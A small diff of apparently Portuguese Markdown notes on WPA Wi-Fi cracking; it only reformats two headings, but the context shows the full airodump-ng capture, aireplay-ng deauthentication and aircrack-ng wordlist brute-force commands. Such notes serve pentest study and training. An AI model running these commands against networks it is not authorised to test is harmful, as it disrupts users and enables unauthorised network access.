@@ -13,7 +13,7 @@ mkdir wpa
 cd wpa
 airodump-ng --bssid BSSIDTARGET -c 11 -w cvr wlan0mon
 ```
-2-Desautenticar para forçar o handshake
+## 2. Desautenticar para forçar o handshake
 ```bash
 aireplay-ng -0 1 -a TARGETBSSID wlan0mon
 # -0 = tipo do ataque (deauth)
@@ -21,7 +21,7 @@ aireplay-ng -0 1 -a TARGETBSSID wlan0mon
 # -a 00:17:9A:35:53:22 = Access Point (BSSID)
 ```
 
-3-Brute force
+## 3. Brute force
 ```bash
 aircrack-ng -b TARGETBSSID -w /usr/share/wordlists/dirb/big.txt cvr-01.cap
 ```
